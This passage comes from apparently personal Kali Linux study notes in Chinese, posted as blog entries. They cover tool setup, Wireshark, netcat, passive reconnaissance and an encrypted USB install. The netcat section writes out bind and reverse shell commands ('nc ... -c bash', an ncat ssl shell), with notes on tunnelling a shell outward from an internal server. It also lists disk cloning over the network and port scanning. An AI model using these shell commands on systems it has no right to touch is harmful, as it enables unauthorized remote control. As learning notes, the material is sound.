<li>mtr（路由追踪，图形化界面，同traceroute，<strong>🔺命令：mtr ip地址</strong>）</li>
<li>file-zilla、file-zilla-common(ftp客户端)</li>
<li>chromium（谷歌浏览器）</li>
<li>monodevelop、mono-gmcs-y（.net开发环境）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>库中不存在的工具列表（2019.11.22）
flashplugin-nonfree
stardict
amule
monodevelop
mono-gmcs-y</code></pre></blockquote>
<h4 id="8-浏览器插件"><a href="#8-浏览器插件" class="headerlink" title="8. 浏览器插件"></a>8. 浏览器插件</h4><ul>
<li>firefox浏览器插件<ul>
<li>AutoProxy（翻墙指定代理）▲2019.12.29 替换为FoxyProxy</li>
<li>Cookie Importer（导入Cookie）▲2019.11.22替换为Cookie Import Export</li>
<li>Cookies Manager（管理Cookie信息）</li>
<li>Download YouTube Videos as MP4（下载MP4视频）▲2019.11.22替换为YouTube Download plus</li>
<li>Firebug（基于Web调试）▲2019.11.22替换为Firebug Persona</li>
<li>Flagfox（网页国家服务器）</li>
<li>FlashGot（允许视频文件下载）</li>
<li>HackBar（Web渗透测试重要工具）</li>
<li>hashr（计算哈希值）▲2019.11.22替换为PwdHash</li>
<li>Live HTTP headers（对HTTP header进行拦截，查看）</li>
<li>SQL Inject Me（SQL注入攻击）▲2019.11.22未找到</li>
<li>Tamper Data（浏览器向服务器的HTTP进行查看，修改数据包头）▲2019.11.22未找到</li>
<li>User Agent Switcher（修改特征字符串，firefox→IE）</li>
<li>XSS Me（跨站脚本攻击）▲2019.11.22替换为EasyXSS</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>浏览器（alt键）→Tools→Add-ons
XSS-Me（https://addons.mozilla.org/en-US/firefox/addon/xss-me）
SQL-Inject-Me(https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/$src=ss)</code></pre></blockquote>
<h4 id="9-安装JAVA-1"><a href="#9-安装JAVA-1" class="headerlink" title="9. 安装JAVA-1"></a>9. 安装JAVA-1</h4><ul>
<li>下载(<a href="https://www.oracle.com/technetwork/java/javase/downloads）" target="_blank" rel="noopener">https://www.oracle.com/technetwork/java/javase/downloads）</a></li>
<li>解压缩包（需要下载jdk和jre两者合并的包，2019.11.22用的是jdk-8u231包）<ul>
<li><strong><code>🔺命令：tar -xzvf java路径</code></strong></li>
<li><strong><code>🔺命令：mv jdk版本 /opt</code></strong></li>
<li><strong><code>🔺命令：cd /opt/jdk版本（路径）</code></strong></li>
</ul>
</li>
<li>安装注册<ul>
<li><strong><code>🔺命令：update-alternatives --install /usr/bin/java java /opt/jdk版本/bin/java 1</code></strong></li>
<li><strong><code>🔺命令：update-alternatives --install /usr/bin/javac javac /opt/jdk版本/bin/javac 1</code></strong></li>
<li><strong><code>🔺命令：update-alternatives --install /usr/lib/mozilla/plugins/libjavaplugin.so mozilla-javaplugin.so /opt/jdk路径/jre/lib/amd64/libnpjp2.so 1</code></strong></li>
</ul>
</li>
</ul>
<h4 id="10-安装JAVA-2"><a href="#10-安装JAVA-2" class="headerlink" title="10. 安装JAVA-2"></a>10. 安装JAVA-2</h4><ul>
<li>默认设置<ul>
<li><strong><code>🔺命令：update-alternatives --set java /opt/jdk版本/bin/java</code></strong></li>
<li><strong><code>🔺命令：update-alternatives --set javac /opt/jdk版本/bin/javac</code></strong></li>
<li><strong><code>🔺命令：update-alternatives --set mozilla-javaplugin.so /opt/jdk版本/jre/lib/amd64/libnpjp2.so</code></strong></li>
</ul>
</li>
<li>验证<ul>
<li><strong><code>🔺命令：java -version</code></strong>（主机验证java安装）</li>
<li><a href="http://www.java.com/en/download/installed.jsp" target="_blank" rel="noopener">http://www.java.com/en/download/installed.jsp</a> (网页验证java安装，firefox Version 52之后不提供plugins的验证)</li>
</ul>
</li>
</ul>
<h4 id="11-安装显卡驱动"><a href="#11-安装显卡驱动" class="headerlink" title="11. 安装显卡驱动"></a>11. 安装显卡驱动</h4><ul>
<li>GPU的用途<ul>
<li>Nvidia</li>
<li>Ati</li>
</ul>
</li>
<li>Nvidia显卡驱动安装<ul>
<li><strong><code>🔺命令：apt-get update</code></strong></li>
<li><strong><code>🔺命令：apt-get dist-upgrade</code></strong></li>
<li><strong><code>🔺命令：apt-get install -y（直接安装） linux-headers-$(uname -r)</code></strong></li>
<li><strong><code>🔺命令：apt-get install nvidia-kernel-dkms(Nvidia架构库)</code></strong></li>
<li><strong><code>🔺命令：sed &#39;s/quiet/quiet nouveau.modeset=0/g&#39; -i /etc/default/grub</code></strong></li>
<li><strong><code>🔺命令：update-grub</code></strong></li>
<li><strong><code>🔺命令：reboot</code></strong></li>
</ul>
</li>
<li>验证<ul>
<li><strong><code>🔺命令：glxinfo | grep -i &quot;direct rendering&quot;</code></strong>(需apt-get install mesa-utils，不然会报glxinfo commond not found)<ul>
<li>direct rendering:Yes</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="12-无线网卡补丁"><a href="#12-无线网卡补丁" class="headerlink" title="12. 无线网卡补丁"></a>12. 无线网卡补丁</h4><ul>
<li>最新版内核已经集成无线驱动补丁（版本1.09之前，包括1.09）</li>
<li>如果你在使用老版本内核（<strong><code>🔺命令：uname -a</code></strong>查看版本）▲未验证<ul>
<li><strong><code>🔺命令：cd /usr/src/</code></strong></li>
<li><strong><code>🔺命令：wget https://www.kernel.org/pub/linux/kernel/projects/backports/stable/v kali的版本/backports-kali的版本-1.tar.bz2</code></strong></li>
<li><strong><code>🔺命令：tar xvf backports-kali的版本-1.tar.gz</code></strong></li>
<li><strong><code>🔺命令：cd backports-kali的版本-1</code></strong></li>
<li><strong><code>🔺命令：apt-get install patch</code></strong></li>
<li><strong><code>🔺命令：wget http://patches.aircrack-ng.org/mac80211.compat08082009.wt_frag+ack_v1.patch</code></strong></li>
<li><strong><code>🔺命令：patch -p1 &lt; mac80211.compat08082009.wt_frag+ack_v1.patch</code></strong>`**</li>
<li><strong><code>🔺命令：apt-get install libncurses5-dev</code></strong>(安装开发库文件)</li>
<li><strong><code>🔺命令：airmon-ng</code></strong>(查看驱动)</li>
<li><strong><code>🔺命令：make defconfig-ath9k</code></strong>（替换芯片驱动）</li>
<li><strong><code>🔺命令：make &amp;&amp; make install</code></strong></li>
</ul>
</li>
</ul>
<h4 id="13-并发线程限制"><a href="#13-并发线程限制" class="headerlink" title="13. 并发线程限制"></a>13. 并发线程限制</h4><ul>
<li>ulimit用于限制当前shell内进程的资源使用</li>
<li>查看默认值<ul>
<li><strong><code>🔺命令：ulimit -a</code></strong></li>
</ul>
</li>
<li>全局配置文件：/etc/security/limits<ul>
<li><domain><type><item><value></li>
</ul>
</li>
<li>用途距离<ul>
<li>限制堆栈大小：<strong><code>🔺命令：ulimit -s 100（文件大小）</code></strong></li>
<li>限制shell内存使用：<strong><code>🔺命令：ulimit -m（最大内存大小） 5000 -v（虚拟内存大小） 5000</code></strong></li>
<li>限制并发次数，openfile ：<strong><code>🔺命令：ulimit -n 900000（次数）</code></strong></li>
</ul>
</li>
<li>没有直接对socket数量的限制参数<ul>
<li>Linux系统中一切都是文件，运行中的文件叫做进程</li>
<li><strong><code>🔺命令：vi /.bashrc→ulimit -n 900000</code></strong>（持久化ulimit）</li>
</ul>
</li>
</ul>
<h4 id="14-电源优化（kali耗电非常大）"><a href="#14-电源优化（kali耗电非常大）" class="headerlink" title="14. 电源优化（kali耗电非常大）"></a>14. 电源优化（kali耗电非常大）</h4><ul>
<li>渗透测试系统耗电较大</li>
<li>延长电池寿命<ul>
<li>无操作挂起，关闭显示器(系统设置中的电源，选择操作)</li>
<li>降低显示器亮度（系统设置中的电源，降低亮度）</li>
<li>不使用时关闭无线网卡</li>
<li>开启硬盘省电选项<ul>
<li><strong><code>🔺命令：hdparm -i /dev/sdx if AdvancedPM=yes then hdparm -B 1 -S 12 /dev/sdx</code></strong></li>
</ul>
</li>
<li>启动笔记本模式(<strong><code>🔺命令：chmod a+x 脚本</code></strong>)<pre><code>#!/bin/bash
</code></pre></li>
</ul>
</li>
</ul>
<p>currentMode=$(cat /proc/sys/vm/laptop_mode)<br>if [ $currentMode -eq 0 ]<br>then<br>echo “5”&gt;/proc/sys/vm/laptop_mode<br>echo “Laptop Mode Enabled”<br>else<br>echo “0”&gt;/proc/sys/vm/laptop_mode<br>echo “Laptop Mode Disabled”<br>fi</p>
<pre><code>
#### 15. 服务开关

  - Kali Linux默认未启动所有网络服务
  - **`🔺命令：update-rc.d ssh defaults`**（持久化启动服务）
     - **`🔺命令：update-rc.d ssh start 20 2 3 4 5 .stop 20 0 1 6.`**
     - **`🔺命令：update-rc.d A defaults 80（启动优先级） 20（关闭优先级）`**
     - **`🔺命令：update-rc.d B defaults 90（启动优先级） 10（关闭优先级）`**
  - **`🔺命令：/etc/init.d/ssh start`**(临时开启服务)
  - 重启操作系统 **`🔺命令：init 6`**
  - 关闭操作系统 **`🔺命令：init 0`**

&gt;     运行级别：
&gt;     0：关机
&gt;     1：单用户模式
&gt;     2.3.4.5：多用户模式
&gt;     6：重启</code></pre>]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(二)：Wireshark</title>
    <url>/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83)%EF%BC%9AWireshark/</url>
    <content><![CDATA[<hr>
<h4 id="1-WIRESHARK"><a href="#1-WIRESHARK" class="headerlink" title="1. WIRESHARK"></a>1. WIRESHARK</h4><ul>
<li>抓包嗅探协议分析</li>
<li>安全专家必备的技能</li>
<li>抓包引擎<ul>
<li>Libpcap9–Linux</li>
<li>Winpcap10–Windows</li>
</ul>
</li>
<li>解码能力（衡量抓包软件能力强弱）</li>
</ul>
<h4 id="2-WIRESHARK-基本使用"><a href="#2-WIRESHARK-基本使用" class="headerlink" title="2. WIRESHARK-基本使用"></a>2. WIRESHARK-基本使用</h4><ul>
<li>启动</li>
<li>选择抓包网卡</li>
<li>混杂模式</li>
<li>实时抓包</li>
<li>保存和分析捕获文件</li>
<li>首选项（布局调整：Edit → Preferences）</li>
</ul>
<blockquote>
<pre><code>混杂模式会抓以太网内所有的包，非混杂只抓取到达自己网卡的包（Enable promiscuous mode on all interfaces）
抓包筛选器（Capture Filter），可自己设置（如：host ip地址）</code></pre></blockquote>
<h4 id="3-WIRESHARK-筛选器"><a href="#3-WIRESHARK-筛选器" class="headerlink" title="3. WIRESHARK-筛选器"></a>3. WIRESHARK-筛选器</h4><ul>
<li>过滤掉干扰的数据包</li>
<li>抓包筛选器</li>
<li>显示筛选器（右键 → Apply as Filter，可对任何数据）</li>
</ul>
<blockquote>
<pre><code>Network → Capture Filters → Capture Engine → Dispaly Filters</code></pre></blockquote>
<h4 id="4-数据包的分层结构"><a href="#4-数据包的分层结构" class="headerlink" title="4.  数据包的分层结构"></a>4.  数据包的分层结构</h4><ul>
<li>ARP</li>
<li>ICMP</li>
<li>TCP-三次握手</li>
<li>UDP</li>
<li>DNS</li>
<li>HTTP</li>
<li>FTP</li>
</ul>
<blockquote>
<pre><code>对于非官方端口解析：选中 → 右键 → Decode As → HTTP</code></pre></blockquote>
<h4 id="5-WIRESHARK-TCP"><a href="#5-WIRESHARK-TCP" class="headerlink" title="5. WIRESHARK-TCP"></a>5. WIRESHARK-TCP</h4><ul>
<li>数据流<ul>
<li>http（明文传输）</li>
<li>Smtp（明文传输）</li>
<li>Pop3（明文传输）</li>
<li>Ssl（密文传输，公钥证书是以明文传输的形式）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>完整的数据响应过程：选中 → 右键 → follow TCP/UDP stream</code></pre></blockquote>
<h4 id="6-WIRESHARK-信息统计（Statistics、Analyze）"><a href="#6-WIRESHARK-信息统计（Statistics、Analyze）" class="headerlink" title="6. WIRESHARK-信息统计（Statistics、Analyze）"></a>6. WIRESHARK-信息统计（Statistics、Analyze）</h4><ul>
<li>节点数–Summary摘要信息、Endpoints包的总数统计 ▲2019.11.26Summary改版为Capture File Properties</li>
<li>协议分析–Protocol Hierarchy当前数据包的协议类型（DNS占比不大）</li>
<li>包大小分布–Packet Lengths包的长度（小包占比大说明网络性能不好）</li>
<li>会话连接–Conversations机器间的会话（若少量会话占用程序，说明僵尸网络在发包）</li>
<li>解码方式–Decode AS解析成自定义协议</li>
<li>专家系统–Expert info软件自带分析 ▲2019.11.26Expert info改版为Expert information</li>
</ul>
<h4 id="7-WIRESHARK-实践"><a href="#7-WIRESHARK-实践" class="headerlink" title="7. WIRESHARK-实践"></a>7. WIRESHARK-实践</h4><ul>
<li><p>抓包对比nc、ncat加密与不加密的流量</p>
<ul>
<li>nc传输（明文传输）</li>
</ul>
<ol>
<li>ARP</li>
<li>TCP三次握手</li>
<li>反向ARP</li>
<li>开始TCP传输数据</li>
</ol>
</li>
</ul>
<blockquote>
<pre><code>follow TCP stream为明文传输</code></pre></blockquote>
<ul>
<li><p>抓包对比nc、ncat加密与不加密的流量  </p>
<ul>
<li>ncat传输（密文传输）</li>
</ul>
<ol>
<li>ARP</li>
<li>TCP三次握手</li>
<li>反向ARP</li>
<li>开始TCP传输数据</li>
</ol>
</li>
</ul>
<blockquote>
<pre><code>follow TCP stream为密文传输，一些Ncat特征为明文传输</code></pre></blockquote>
<ul>
<li>企业抓包部署方案（镜像端口 → 全流量，多块网卡捆绑，被动式扫描）<ul>
<li>Sniffer</li>
<li>Cace/riverbed（建立索引，易于大文件分析）</li>
<li>Cascad pilot</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(六)：NETCAT</title>
    <url>/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD)%EF%BC%9ANETCAT/</url>
    <content><![CDATA[<hr>
<h4 id="1-常使用工具"><a href="#1-常使用工具" class="headerlink" title="1. 常使用工具"></a>1. 常使用工具</h4><ul>
<li>经常使用且功能强大</li>
<li>安全从业者必不可少的帮手</li>
<li>Nc/ncat</li>
<li>Wireshark</li>
<li>Tcp dump</li>
</ul>
<h4 id="2-NETCAT-NC"><a href="#2-NETCAT-NC" class="headerlink" title="2. NETCAT-NC"></a>2. NETCAT-NC</h4><ul>
<li>网络工具中的瑞士军刀-小身材，大智慧</li>
<li>侦听模式/传输模式</li>
<li>telnet/获取banner信息（比telnet稳定）</li>
<li>传输文本信息</li>
<li>传输文件/目录（ftp服务器）</li>
<li>加密传输文件</li>
<li>远程控制/木马</li>
<li>加密所有流量</li>
<li>流媒体服务器</li>
<li>远程克隆硬盘</li>
</ul>
<h4 id="3-NC-TELNET-BANNER"><a href="#3-NC-TELNET-BANNER" class="headerlink" title="3. NC-TELNET/BANNER"></a>3. NC-TELNET/BANNER</h4><blockquote>
<pre><code>nc-nv 1.1.1.1 110
nc-nv 1.1.1.1 25
nc-nv 1.1.1.1 80</code></pre></blockquote>
<ul>
<li><strong><code>🔺命令：ping smtp.163.com、pop3.163.com</code></strong>（测试网络）</li>
<li><strong><code>🔺命令：netstat -rn</code></strong>（查看网络连接）</li>
<li>nc -vn（域名相关详细信息，建议将域名解析出来）</li>
<li><strong><code>🔺命令：nc -nv ip地址 110</code></strong>（pop3服务器）</li>
<li><strong><code>🔺命令：USER</code></strong> （base64 邮箱地址）</li>
<li><strong><code>🔺命令：nc -nv ip地址 25</code></strong>（smtp服务器）</li>
<li><strong><code>🔺命令：ehlo 名字</code></strong>（可看到命令行选项）</li>
<li><strong><code>🔺命令：nc -nv ip地址 80</code></strong>（http服务器，metasploitable）</li>
<li><strong><code>🔺命令：get head/</code></strong>（两者不可重复使用，一样的效果）</li>
</ul>
<blockquote>
<pre><code>Kali base64命令的使用
1.启动终端
2.输入base64
3.输入需要编码的字符串
4.CTRL+D，结束输入，在屏幕上会显示出结果</code></pre></blockquote>
<h4 id="4-NC-传输文本信息"><a href="#4-NC-传输文本信息" class="headerlink" title="4. NC-传输文本信息"></a>4. NC-传输文本信息</h4><ul>
<li>A： <strong><code>🔺命令：nc -l -p 端口号</code></strong>（开放一个端口，作为服务端）</li>
<li>B： <strong><code>🔺命令：nc -nv IP地址 端口号</code></strong>（连接对方端口，作为客户端）</li>
<li>远程电子取证收集<ul>
<li><strong><code>🔺命令：ls -l | nc -nv IP地址 端口号</code></strong>（服务端）</li>
<li><strong><code>🔺命令：nc -l -p 333 &gt; ps.txt</code></strong>（服务端） <strong><code>🔺命令：ps aux | nc -nv IP地址 端口 -q（有结束标志EOF） 1</code></strong>（客户端）</li>
</ul>
</li>
</ul>
<h4 id="5-NC-传输文件-目录"><a href="#5-NC-传输文件-目录" class="headerlink" title="5. NC-传输文件/目录"></a>5. NC-传输文件/目录</h4><ul>
<li>传输文件<ul>
<li>A:<strong><code>🔺命令：nc -lp 端口号&gt;x.mp4</code></strong>（接收端）</li>
<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号&lt; x.mp4 -q 1</code></strong>（发送端）</li>
<li>or</li>
<li>A:<strong><code>🔺命令：nc -lp 端口号 &lt; x.mp4 -q 1</code></strong>（发送端）</li>
<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号 &gt;x.mp4</code></strong>（接收端）</li>
</ul>
</li>
<li>传输目录 ▲2019.11.25实验未成功<ul>
<li>A:<strong><code>🔺命令：tar -cvf -文件名/ | nc -lp 端口号 -q 1</code></strong>（发送端）</li>
<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号 | tar -xvf -</code></strong>（接收端）</li>
</ul>
</li>
<li>加密传文件（操作系统安装的mcrypt）<ul>
<li>A:<strong><code>🔺命令：nc -lp 端口号 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; x.mp4</code></strong>（接收端）</li>
<li>B:<strong><code>🔺命令：mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; x.mp4 | nc -nv ip地址 端口号 -q 1</code></strong>（发送端）</li>
</ul>
</li>
</ul>
<h4 id="6-NC-流媒体服务（需安装mplayer）"><a href="#6-NC-流媒体服务（需安装mplayer）" class="headerlink" title="6. NC-流媒体服务（需安装mplayer）"></a>6. NC-流媒体服务（需安装mplayer）</h4><ul>
<li>A:<strong><code>🔺命令：cat x.mp4 | nc -lp 端口号</code></strong></li>
<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号 | mplayer -vo x11 -cache 3000 -</code></strong></li>
</ul>
<h4 id="7-NC-端口扫描"><a href="#7-NC-端口扫描" class="headerlink" title="7. NC-端口扫描"></a>7. NC-端口扫描</h4><ul>
<li><strong><code>🔺命令：nc -nvz ip地址 x-x(TCP端口号)</code></strong></li>
<li><strong><code>🔺命令：nc -nvzu ip地址 x-x(UDP端口号)</code></strong></li>
</ul>
<h4 id="8-NC-远程克隆硬盘-▲2019-11-25未验证"><a href="#8-NC-远程克隆硬盘-▲2019-11-25未验证" class="headerlink" title="8. NC-远程克隆硬盘 ▲2019.11.25未验证"></a>8. NC-远程克隆硬盘 ▲2019.11.25未验证</h4><ul>
<li>A:<strong><code>🔺命令：nc -lp 端口号 | dd of=/dev/sda</code></strong></li>
<li>B:<strong><code>🔺命令：dd if=/dev/sda | nc -nv IP地址 端口号 -q 1</code></strong></li>
<li>远程电子取证，可以将目标服务器硬盘远程复制，或者内存</li>
</ul>
<blockquote>
<pre><code>硬盘删除文件，只删除文件名的索引，不完整删除文件，进行标记，可以进行恢复
dd进行磁盘复制，是完整的镜像硬盘复制，包括删除的文件标记</code></pre></blockquote>
<h4 id="9-NC-远程控制"><a href="#9-NC-远程控制" class="headerlink" title="9. NC-远程控制"></a>9. NC-远程控制</h4><ul>
<li>正向<ul>
<li>A:<strong><code>🔺命令：nc -lp 端口 -c bash</code></strong></li>
<li>B:<strong><code>🔺命令：nc -nv IP地址 端口号</code></strong></li>
</ul>
</li>
<li>反向<ul>
<li>A:<strong><code>🔺命令：nc -lp 端口号</code></strong></li>
<li>B:<strong><code>🔺命令：nc -nv IP地址 端口号 -c bash</code></strong></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>Windows用户把bash改成cmd
IDC机房可以采用服务器作为客户端，由内网向外网连接侦听的外部服务器，传递bash</code></pre></blockquote>
<h4 id="10-NC-NCAT（区别于NC，是加密的管道，集成于NMAP）▲2019-11-25需要安装，会覆盖netcat"><a href="#10-NC-NCAT（区别于NC，是加密的管道，集成于NMAP）▲2019-11-25需要安装，会覆盖netcat" class="headerlink" title="10. NC-NCAT（区别于NC，是加密的管道，集成于NMAP）▲2019.11.25需要安装，会覆盖netcat"></a>10. NC-NCAT（区别于NC，是加密的管道，集成于NMAP）▲2019.11.25需要安装，会覆盖netcat</h4><ul>
<li>NC缺乏加密和身份验证的能力（可被嗅探，基本上是透明的，可在外部系统加密再进行传输）</li>
<li>Ncat包含nmap工具包中</li>
<li>A:<strong><code>🔺命令：ncat -c bash --allow IP地址 -vnl 端口号 --ssl</code></strong></li>
<li>B:<strong><code>🔺命令：ncat -nv IP地址 端口 --ssl</code></strong></li>
<li>不同系统/平台的nc参数功能不尽相同</li>
</ul>
<blockquote>
<pre><code>window系统不存在-c参数，需要通过中间文本去传递shell
查询用户手册：🔺命令：man nc（man手册）or 🔺命令：nc -h or 🔺命令：info nc</code></pre></blockquote>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(九)：被动信息收集介绍</title>
    <url>/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D)%EF%BC%9A%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<hr>
<h4 id="1-被动信息收集"><a href="#1-被动信息收集" class="headerlink" title="1. 被动信息收集"></a>1. 被动信息收集</h4><ul>
<li>公开渠道可获得的信息（互联网媒体方式、搜索网站）</li>
<li>与目标系统不产生直接交互（不对目标系统进行大量的探测）</li>
<li>尽量避免留下一切痕迹</li>
<li>OSINT：<ul>
<li>美国军方：<a href="http://www.fas.org/lirp/doddir/army/atp2-229.pdf" target="_blank" rel="noopener">http://www.fas.org/lirp/doddir/army/atp2-229.pdf</a> ▲2019.11.27未找到文件</li>
<li>北大西洋公约组织：<a href="http://information-retrieval.info/docs/NATO-OSINT.html" target="_blank" rel="noopener">http://information-retrieval.info/docs/NATO-OSINT.html</a></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>Passive reconnaissance(no direct interaction) → 被动侦察
Normal interaction 
Active reconnaissance  → 主动侦察
More infomation greater chance of detection</code></pre></blockquote>
<h4 id="2-信息收集内容"><a href="#2-信息收集内容" class="headerlink" title="2. 信息收集内容"></a>2. 信息收集内容</h4><ul>
<li>IP地址</li>
<li>域名信息</li>
<li>邮件地址（定位邮件服务器，后期社会工程学）</li>
<li>文档图片数据（网络结构，内网交互）</li>
<li>公司地址</li>
<li>公司组织架构</li>
<li>联系电话/传真号码</li>
<li>人员姓名/职务</li>
<li>目标系统使用的技术架构（搜索引擎技术可以发现一部分信息）</li>
<li>公开的商业信息</li>
</ul>
<h4 id="3-信息用途"><a href="#3-信息用途" class="headerlink" title="3. 信息用途"></a>3. 信息用途</h4><ul>
<li>用信息描述目标（重构）</li>
<li>发现（目标主机）</li>
<li>社会工程学攻击</li>
<li>物理缺口</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(二)：Kali Linux安装</title>
    <url>/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C)%EF%BC%9AKali%20Linux%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<hr>
<h4 id="1-硬盘安装"><a href="#1-硬盘安装" class="headerlink" title="1. 硬盘安装"></a>1. 硬盘安装</h4><ul>
<li>下载安装镜像（<a href="http://www.kail.org/Downloads/" target="_blank" rel="noopener">http://www.kail.org/Downloads/</a>  (arm,mini)）</li>
<li>验证hash值（排除文件损失造成的故障，保证文件完整性）</li>
<li>制作启动光盘（live）（推荐UNetbootin启动光盘软件）</li>
<li>制作启动U盘（live-不可安装新软件，live-usb-可安装新软件）</li>
<li>设置BIOS启动顺序</li>
<li>启动安装</li>
</ul>
<h4 id="2-Docker"><a href="#2-Docker" class="headerlink" title="2.Docker"></a>2.Docker</h4><ul>
<li><p>虚拟化和Docker(容器–运行所需要的组件)</p>
</li>
<li><p>Kail Docker image</p>
<p><a href="https://www.kail.org/news/official-kail-linux-docker-images/" target="_blank" rel="noopener">https://www.kail.org/news/official-kail-linux-docker-images/</a></p>
<p><a href="https://github.com/offensive-security/kail-linux-docker" target="_blank" rel="noopener">https://github.com/offensive-security/kail-linux-docker</a></p>
</li>
</ul>
<h4 id="3-虚拟机安装"><a href="#3-虚拟机安装" class="headerlink" title="3.虚拟机安装"></a>3.虚拟机安装</h4><ul>
<li>官方VM镜像<br> <a href="https://www.offensive-security.com/kail-linux-vmware-arm-image-download/" target="_blank" rel="noopener">https://www.offensive-security.com/kail-linux-vmware-arm-image-download/</a></li>
<li>VMware workstation（插件多，文件比较大）</li>
<li>VirtualBox<ul>
<li>下载、安装、扩展工具、基本使用</li>
<li>Win8系统</li>
</ul>
</li>
</ul>
<blockquote>
<p>(卸载kb3045999，通过powershell，get-hotfix-id+固件，wsa /install /bb：+id）</p>
</blockquote>
<ul>
<li>VirtualBox<ul>
<li>安装kail</li>
<li>安装tools</li>
</ul>
</li>
</ul>
<p><strong><code>🔺命令：uname -r 查看linux版本</code></strong></p>
<blockquote>
<p>要安装最新版的linux-heads才能安装vmware-tools，再者可以通过apt-get install</p>
</blockquote>
<h4 id="4-持久加密USB安装"><a href="#4-持久加密USB安装" class="headerlink" title="4. 持久加密USB安装"></a>4. 持久加密USB安装</h4><blockquote>
<p>共享文件夹：/medie/sf_D_Drive（物理主机目录）（2.0版本在/mnt/hfgs下）</p>
</blockquote>
<ul>
<li>LUKS：Linux Unified Key Setup（基于Linux平台开发）<ul>
<li>磁盘分区加密规范</li>
<li>不依赖于操作系统的磁盘级加密</li>
<li>Windows-DoxBox（通过前端后端组件进行加密）</li>
<li>后端：dm-crypt</li>
<li>前端：cryptsetup</li>
<li>微软的bitlocker</li>
</ul>
</li>
<li>将镜像刻录到U盘</li>
</ul>
<blockquote>
<p>1.操作系统的删除文件名，只是删除索引，可通过数据还原技术再恢复</p>
</blockquote>
<blockquote>
<p>(1)文件拷贝：拷贝单个文件到设备</p>
</blockquote>
<blockquote>
<p>(2)块拷贝：将原磁盘每一个扇区存取的每一块数据完全镜像复制到设备（电子取证）</p>
</blockquote>
<ul>
<li><p>将镜像刻录到U盘</p>
<p> <strong><code>🔺命令：dd if=kail-linux-1.1.0-amd64.iso of=/dev/sdb bs=1M</code></strong></p>
<p> if：input file </p>
<p> of：out file bs（复制速度）</p>
<p> dd(以基于块的模式拷贝到块设备，不同基于文件拷贝)</p>
<p> <strong><code>🔺命令：dmesg</code></strong>查看系统操作变化</p>
<ul>
<li>查看插入的u盘所在的位置/sdx</li>
<li>查看U盘原有数据（系统工具-系统管理-Gpatted分区管理器）</li>
<li>卸载分区</li>
<li>删除分区</li>
<li>应用操作</li>
<li>应用dd命令，以块的形式，拷贝到U盘（U盘剩下的空间用于系统加密，若有进行操作，将操作记录在加密部分）</li>
</ul>
<p><strong><code>🔺命令：watch -n 5 killall USR1 dd</code></strong>(汇报工作进展）</p>
</li>
</ul>
<blockquote>
<p>1.Window下的efs加密–文件级别加密，用管理员登陆，可以看到文件加密的信息</p>
</blockquote>
<blockquote>
<p>2.磁盘分区级别的加密，需要密钥，需要证书才可以解出</p>
</blockquote>
<h4 id="5-持久加密USB安装-2"><a href="#5-持久加密USB安装-2" class="headerlink" title="5. 持久加密USB安装-2"></a>5. 持久加密USB安装-2</h4><ul>
<li>为U盘创建额外分区<ul>
<li><strong><code>🔺命令：partx</code></strong>分区工具</li>
<li><strong><code>🔺命令：printf devices</code></strong>列出操作系统挂载的硬盘</li>
<li><strong><code>🔺命令：select /dev/sdx</code></strong>选择要操作的U盘</li>
<li><strong><code>🔺命令：mkpart primary</code></strong>起始位置（上一个分区位置）结束位置（分区大小）</li>
<li><strong><code>🔺命令：quit</code></strong>退出分区工具</li>
</ul>
</li>
<li>使用LUKS加密分区<ul>
<li><strong><code>🔺命令：cryptsetup --verbose --verify-passphrase luksFormat /dev/</code></strong>sdx+分区</li>
<li>输入保护密码</li>
</ul>
</li>
<li>打开加密分区<ul>
<li><strong><code>🔺命令：cryptsetup luksOpen /dev/sdx+分区 usb（可读名称）</code></strong></li>
<li><strong><code>🔺命令：ls /dev/mapper/usb（可读名称）</code></strong></li>
</ul>
</li>
<li>格式化加密分区+卷标<ul>
<li><strong><code>🔺命令：mkfs.ext4（目前最新版本） /dev/mapper/usb（可读名称）</code></strong></li>
<li><strong><code>🔺命令：e2label /dev/mapper/usb（可读名称）persistence（官方指定卷标）</code></strong></li>
</ul>
</li>
<li>挂载加密分区，并创建persistence.conf文件<ul>
<li><strong><code>🔺命令：mkdir -p /mnt/usb</code></strong></li>
<li><strong><code>🔺命令：mount /dev/mapper/usb /mnt/usb/</code></strong></li>
<li><strong><code>🔺命令：echo &quot;/ union&quot; &gt; /mnt/usb/persistence.conf</code></strong></li>
<li><strong><code>🔺命令：umount /dev/mapper/usb</code></strong></li>
<li><strong><code>🔺命令：cryptsetup luksClose /dev/mapper/usb</code></strong></li>
</ul>
</li>
</ul>
<h4 id="6-持久加密USB安装-3"><a href="#6-持久加密USB安装-3" class="headerlink" title="6. 持久加密USB安装-3"></a>6. 持久加密USB安装-3</h4><ul>
<li>Live USB Encrypted Persistence</li>
